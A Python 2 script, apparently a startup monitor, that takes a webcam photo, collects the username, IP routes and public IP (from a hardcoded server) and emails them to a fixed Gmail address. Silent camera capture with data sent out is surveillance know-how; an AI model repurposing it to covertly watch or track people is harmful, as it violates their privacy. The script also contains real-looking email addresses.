#! /usr/bin/python
#encoding: utf-8
import os
import sys
import time
import socket
import smtplib
import threading
import subprocess
import email.MIMEBase
import email.MIMEText
import email.MIMEMultipart
from time import sleep
from random import randint

def make_info():
    title = 'start up ' + time.asctime()
    text = 'Gateway: ' + get_my_ip(server_and_port) + ' user: ' + run_cmd('whoami') + 'ip list:\n' + run_cmd('ip route list')
    return title, text

def take_photo(file_name = 'camerate.jpeg'):
    import pygame.image
    import pygame.camera
    pygame.camera.init()
    cam = pygame.camera.Camera(pygame.camera.list_cameras()[0])

    cam.start()
    img = cam.get_image()
    pygame.image.save(img, file_name)
    pygame.camera.quit()
    cam.stop()


def run_cmd(command):
        command = command.rstrip()
        try:
                output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
        except:
                output = "Failed to execute command.\r\n"

        return output

def get_my_ip(host_info):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(host_info)
    client.settimeout(5)
    ip = client.recv(20)
    return ip

server_and_port = ('192.241.196.196', 9999)

def make_accessory(file_name):
        if file_name is None:
                return None
        # 构造MIMEBase对象做为文件附件内容并附加到根容器
        contype = 'application/octet-stream'
        maintype, subtype = contype.split('/', 1)
        file_msg = email.MIMEBase.MIMEBase(maintype, subtype)
        data = open(file_name, 'rb')
        file_msg.set_payload(data.read())
        data.close()
        email.Encoders.encode_base64(file_msg)
        ## 设置附件头
        from os.path import basename
        file_msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(basename(file_name)))
        return file_msg

def send_email(sender, server, receivers, title, text, data=None):
        # 构造MIMEMultipart对象做为根容器
        main_msg = email.MIMEMultipart.MIMEMultipart()
        # 构造MIMEText对象做为邮件显示内容并附加到根容器
        # Uncomment this to get the login user account information
        #text += ('\n' + usr + '@' + pwd + '\n')
        text_msg = email.MIMEText.MIMEText(text)
        main_msg.attach(text_msg)

        if data is not None:
                main_msg.attach(data)
        # 设置根容器属性
        main_msg['From'] = sender
        main_msg['To'] = receivers
        main_msg['Subject'] = title
        main_msg['Date'] = email.Utils.formatdate( )
        # 得到格式化后的完整文本
        fullText = main_msg.as_string()
        server.sendmail(sender, receivers.split(';'), fullText)
        server.quit()

def log_in(From):
        from getpass import getpass
        pwd = getpass('password fir %s: ' %From)
        usr = From.split('@')[0]
        server = smtplib.SMTP("smtp.qq.com")
        server.login(usr, pwd)
        return server

def make_file_name():
    file_name = '/tmp/user-' + str(randint(1, 1024)) + '.jpeg'
    return file_name

if __name__ == '__main__':
    From = "2932716209@qq.com"
    To   = 'albertwb951@gmail.com'

    try:
        server = log_in(From)
        print "log in: %s successfully\n" %From
    except Exception as error:
        print error
        sys.exit(1)

    file_name = make_file_name()
    take_photo(file_name)

    title, text = make_info()
    sent = False
    while sent is False:
        try:
            send_email(From, server, To, title, text=text, data=make_accessory(file_name))
            sent = True
            print 'Done'
        except Exception as error:
            print error
            sleep(10)
